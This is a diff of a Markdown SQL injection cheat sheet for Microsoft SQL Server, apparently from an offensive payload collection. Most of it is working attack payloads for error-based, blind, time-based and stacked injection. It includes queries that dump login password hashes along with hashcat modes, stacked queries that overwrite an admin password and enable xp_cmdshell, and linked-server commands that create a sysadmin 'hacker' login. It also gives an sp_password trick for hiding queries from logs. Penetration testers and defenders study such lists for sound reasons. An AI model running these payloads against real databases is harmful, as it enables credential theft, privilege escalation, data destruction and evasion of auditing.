@@ -2,13 +2,16 @@
 
 ## Summary
 
-* [MSSQL comments](#mssql-comments)
-* [MSSQL version](#mssql-version)
-* [MSSQL database name](#mssql-database-name)
+* [MSSQL Default Databases](#mssql-default-databases)
+* [MSSQL Comments](#mssql-comments)
+* [MSSQL User](#mssql-user)
+* [MSSQL Version](#mssql-version)
+* [MSSQL Hostname](#mssql-hostname)
+* [MSSQL Database Name](#mssql-database-name)
+* [MSSQL Database Credentials](#mssql-database-credentials)
 * [MSSQL List databases](#mssql-list-databases)
 * [MSSQL List columns](#mssql-list-columns)
 * [MSSQL List tables](#mssql-list-tables)
-* [MSSQL Extract user/password](#mssql-extract-userpassword)
 * [MSSQL Union Based](#mssql-union-based)
 * [MSSQL Error Based](#mssql-error-based)
 * [MSSQL Blind Based](#mssql-blind-based)
@@ -21,37 +24,84 @@
     * [MSSQL UNC path](#mssql-unc-path)
 * [MSSQL Make user DBA](#mssql-make-user-dba-db-admin)
 * [MSSQL Trusted Links](#mssql-trusted-links)
+* [MSSQL List permissions](#mssql-list-permissions)
 
-## MSSQL comments
 
-```sql
--- comment goes here
-/* comment goes here */
-```
+## MSSQL Default Databases
+
+| Name                  | Description                           |
+|-----------------------|---------------------------------------|
+| pubs	                | Not available on MSSQL 2005           |
+| model	                | Available in all versions             |
+| msdb	                | Available in all versions             |
+| tempdb	            | Available in all versions             |
+| northwind	            | Available in all versions             |
+| information_schema	| Availalble from MSSQL 2000 and higher |
+
+
+## MSSQL Comments
+
+| Type                       | Description                       |
+|----------------------------|-----------------------------------|
+| `/* MSSQL Comment */`      | C-style comment                   |
+| `-- -`                     | SQL comment                       |
+| `;%00`                     | Null byte                         |
+
 
 ## MSSQL User
 
 ```sql
 SELECT CURRENT_USER
+SELECT user_name();
+SELECT system_user;
+SELECT user;
 ```
 
-## MSSQL version
+## MSSQL Version
 
 ```sql
 SELECT @@version
 ```
 
-## MSSQL database name
+## MSSQL Hostname
+
+```sql
+SELECT HOST_NAME()
+SELECT @@hostname
+SELECT @@SERVERNAME
+SELECT SERVERPROPERTY('productversion')
+SELECT SERVERPROPERTY('productlevel')
+SELECT SERVERPROPERTY('edition');
+```
+
+## MSSQL Database name
 
 ```sql
 SELECT DB_NAME()
 ```
+
+
+## MSSQL Database Credentials
+
+* **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`
+    ```sql
+    SELECT name, password FROM master..sysxlogins
+    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
+    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
+    ```
+* **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`
+    ```sql
+    SELECT name, password_hash FROM master.sys.sql_logins
+    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
+    ```
+
 
 ## MSSQL List databases
 
 ```sql
 SELECT name FROM master..sysdatabases;
 SELECT DB_NAME(N); — for N = 0, 1, 2, …
+SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb   (Only works in MSSQL 2017+)
 ```
 
 ## MSSQL List columns
@@ -71,19 +121,9 @@ SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
 SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
 
 SELECT table_catalog, table_name FROM information_schema.columns
+SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
 ```
 
-## MSSQL Extract user/password
-
-```sql
-MSSQL 2000:
-SELECT name, password FROM master..sysxlogins
-SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)
-
-MSSQL 2005
-SELECT name, password_hash FROM master.sys.sql_logins
-SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
-```
 
 ## MSSQL Union Based
 
@@ -109,6 +149,7 @@ $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name =
 $ SELECT  UserId, UserName from Users
 ```
 
+
 ## MSSQL Error based
 
 ```sql
@@ -119,14 +160,24 @@ For string inputs   : ' + convert(int,@@version) + '
 For string inputs   : ' + cast((SELECT @@version) as int) + '
 ```
 
+
 ## MSSQL Blind based
 
 ```sql
+AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
+
+AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
+AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
+AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
+
+AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
+
 SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
 
 WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
 SELECT message FROM data WHERE row = 1 and message like 't%'
 ```
+
 
 ## MSSQL Time based
 
@@ -137,16 +188,30 @@ ProductID=1';waitfor delay '0:0:10'--
 ProductID=1');waitfor delay '0:0:10'--
 ProductID=1));waitfor delay '0:0:10'--
 
-IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'     comment:   --
+IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
+IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
 ```
+
 
 ## MSSQL Stacked Query
 
-Use a semi-colon ";" to add another query
+* Without any statement terminator
+    ```sql
+    -- multiple SELECT statements
+    SELECT 'A'SELECT 'B'SELECT 'C'
 
-```sql
-ProductID=1; DROP members--
-```
+    -- updating password with a stacked query
+    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--
+
+    -- using the stacked query to enable xp_cmdshell
+    -- you won't have the output of the query, redirect it to a file 
+    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
+    ```
+
+* Use a semi-colon ";" to add another query
+    ```sql
+    ProductID=1; DROP members--
+    ```
 
 
 ## MSSQL Read file
@@ -276,6 +341,42 @@ EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') 
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
 
+## List permissions
+
+Listing effective permissions of current user on the server.
+
+```sql
+SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
+```
+
+Listing effective permissions of current user on the database.
+
+```sql
+SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
+```
+
+Listing effective permissions of current user on a view.
+
+```
+SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
+```
+
+Check if current user is a member of the specified server role.
+
+```sql
+-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
+SELECT is_srvrolemember('sysadmin');
+```
+
+## MSSQL OPSEC
+
+Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password`
+
+```sql
+-- 'sp_password' was found in the text of this event.
+-- The text has been replaced with this comment for security reasons.
+```
+
 ## References
 
 * [Pentest Monkey - mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
@@ -284,3 +385,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 * [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
 * [DAFT: Database Audit Framework & Toolkit - NetSPI](https://github.com/NetSPI/DAFT)
 * [SQL Server UNC Path Injection Cheatsheet - nullbind](https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e)
+* [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - 28 January 2009](https://www.exploit-db.com/papers/12975)
+* [Microsoft - sys.fn_my_permissions (Transact-SQL)](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)
+* [Microsoft - IS_SRVROLEMEMBER (Transact-SQL)](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
+* [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - Jun 21, 2023](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
